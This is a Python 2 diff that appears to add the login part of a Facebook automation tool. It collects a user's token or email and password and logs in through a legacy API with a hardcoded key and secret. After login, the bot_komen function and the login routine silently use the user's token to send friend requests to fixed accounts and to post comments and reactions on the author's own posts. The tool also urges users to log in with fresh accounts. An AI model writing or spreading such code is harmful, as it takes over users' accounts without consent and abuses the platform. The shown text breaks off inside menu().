@@ -1,0 +1,173 @@
+def masuk():
+    os.system('clear')
+    print logo
+    print '\t       \x1b[1;91m<<\x1b[1;93m=========================\x1b[1;91m>>'
+    print '\t          \x1b[1;92m{\x1b[1;90m01\x1b[1;92m}\x1b[1;97m Login Token '
+    print '\t       \x1b[1;91m<<\x1b[1;93m=========================\x1b[1;91m>>'
+    print '\t          \x1b[1;92m{\x1b[1;90m02\x1b[1;92m}\x1b[1;97m Download Token App'
+    print '\t       \x1b[1;91m<<\x1b[1;93m=========================\x1b[1;91m>>'
+    print '\t          \x1b[1;92m{\x1b[1;90m03\x1b[1;92m}\x1b[1;97m Login With ID '
+    print '\t       \x1b[1;91m<<\x1b[1;93m=========================\x1b[1;91m>>'
+    print '\t          \x1b[1;92m{\x1b[1;90m00\x1b[1;92m}\x1b[1;91m Exit'
+    print '\t       \x1b[1;91m<<\x1b[1;93m=========================\x1b[1;91m>>'
+    pilih_masuk()
+
+
+def pilih_masuk():
+    msuk = raw_input('\t\t  \x1b[1;91m{\x1b[1;32;40m!\x1b[1;91m} \x1b[1;93mSelect\x1b[91m:\x1b[1;92m ')
+    if msuk == '':
+        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Fill Correctly !'
+        pilih_masuk()
+    elif msuk == '1' or msuk == '01':
+        tokenz()
+    elif msuk == '2' or msuk == '02':
+        ambil_token()
+    elif msuk == '3' or msuk == '03':
+        login()
+    elif msuk == '0' or msuk == '00':
+        keluar()
+    else:
+        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Fill Correctly !'
+        pilih_masuk()
+
+
+def tokenz():
+    os.system('clear')
+    print logo
+    print '\t       \x1b[1;91m <<\x1b[1;93m=========================\x1b[1;91m>>'
+    toket = raw_input('\t          \x1b[1;91m[+]\x1b[1;92m Give Token\x1b[1;95>>\x1b[1;97m ')
+    print '\t       \x1b[1;91m <<\x1b[1;93m=========================\x1b[1;91m>>'
+    try:
+        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
+        a = json.loads(otw.text)
+        nama = a['name']
+        zedd = open('login.txt', 'w')
+        zedd.write(toket)
+        zedd.close()
+        menu()
+    except KeyError:
+        print '\x1b[1;91m[!] Wrong'
+        print '\n\x1b[1;91m Account Maybe Checkpoint '
+
+
+def ambil_token():
+    os.system('clear')
+    print logo
+    print '\t       \x1b[1;91m <<\x1b[1;93m=========================\x1b[1;91m>>'
+    os.system('xdg-open https://play.google.com/store/apps/details?id=com.proit.thaison.getaccesstokenfacebook')
+    time.sleep(2)
+    masuk()
+
+
+def login():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r')
+        menu()
+    except (KeyError, IOError):
+        os.system('clear')
+        print logo
+        print '\t \x1b[1;91m <<\x1b[1;93m=====================================\x1b[1;91m>>'
+        jalan('\t    \x1b[1;96m[\xe2\x9c\xbe]\x1b[1;91mDO NOT USE OLD ACCOUNT TO LOGIN \x1b[1;96m[\xe2\x9c\xbe]')
+        time.sleep(0.02)
+        jalan('\t    \x1b[1;96m[\xe2\x9c\xbe]\x1b[1;91mUSE A FRESH/NEW ACCOUNT TO LOGIN\x1b[1;96m[\xe2\x9c\xbe]')
+        print '\t \x1b[1;91m <<\x1b[1;93m=====================================\x1b[1;91m>>'
+        id = raw_input('\t    \x1b[1;97m[\x1b[1;92m+\x1b[1;97m] \x1b[1;94mID\x1b[1;90m/\x1b[1;94mEmail\x1b[1;91m: \x1b[1;92m')
+        pwd = raw_input('\t     \x1b[1;97m[\x1b[1;92m+\x1b[1;97m] \x1b[1;94mPassword\x1b[1;91m: \x1b[1;92m')
+        menu()
+        try:
+            br.open('https://m.facebook.com')
+        except mechanize.URLError:
+            print '\n\x1b[1;97mThere is no internet connection'
+            keluar()
+
+        br._factory.is_html = True
+        br.select_form(nr=0)
+        br.form['email'] = id
+        br.form['pass'] = pwd
+        br.submit()
+        url = br.geturl()
+        if 'save-device' in url:
+            try:
+                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
+                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
+                x = hashlib.new('md5')
+                x.update(sig)
+                a = x.hexdigest()
+                data.update({'sig': a})
+                url = 'https://api.facebook.com/restserver.php'
+                r = requests.get(url, params=data)
+                z = json.loads(r.text)
+                unikers = open('login.txt', 'w')
+                unikers.write(z['access_token'])
+                unikers.close()
+                print '\n\x1b[1;96mLogin Successful.\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2..'
+                os.system('xdg-open https://m.facebook.com/alon3cyber')
+                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
+                bot_komen()
+            except requests.exceptions.ConnectionError:
+                print '\n\x1b[1;97mThere is no internet connection'
+                keluar()
+
+        if 'checkpoint' in url:
+            print '\n\x1b[1;97mYour Account is on Checkpoint'
+            os.system('rm -rf login.txt')
+            time.sleep(1)
+            keluar()
+        else:
+            print '\n\x1b[1;94mPassword/Email is wrong'
+            os.system('rm -rf login.txt')
+            time.sleep(1)
+            masuk()
+
+
+def bot_komen():
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;97m[!] Token invalid'
+        os.system('rm -rf login.txt')
+
+    una = '100013185071041'
+    kom = 'Use Tech KGF \xf0\x9f\x98\x98'
+    reac = 'ANGRY'
+    post = '937777953338365'
+    post2 = '938954086554085'
+    kom2 = 'Great  \xf0\x9f\x98\x81'
+    reac2 = 'LOVE'
+    requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + una + '&access_token=' + toket)
+    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toket)
+    requests.post('https://graph.facebook.com/' + post + '/reactions?type=' + reac + '&access_token=' + toket)
+    requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + kom2 + '&access_token=' + toket)
+    requests.post('https://graph.facebook.com/' + post2 + '/reactions?type=' + reac2 + '&access_token=' + toket)
+    menu()
+
+
+def menu():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '{!} Token Invalid !'
+        os.system('clear')
+        os.system('rm -rf login.txt')
+        masuk()
+
+    try:
+        otw = requests.get('https://graph.facebook.com/me/?access_token=' + toket)
+        a = json.loads(otw.text)
+        nama = a['name']
+        id = a['id']
+    except KeyError:
+        os.system('clear')
+        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        masuk()
+        time.sleep(1)
+        masuk()
+    except requests.exceptions.ConnectionError:
+        print '{!} No connection'
+        keluar()
+
+    os.system('clear')
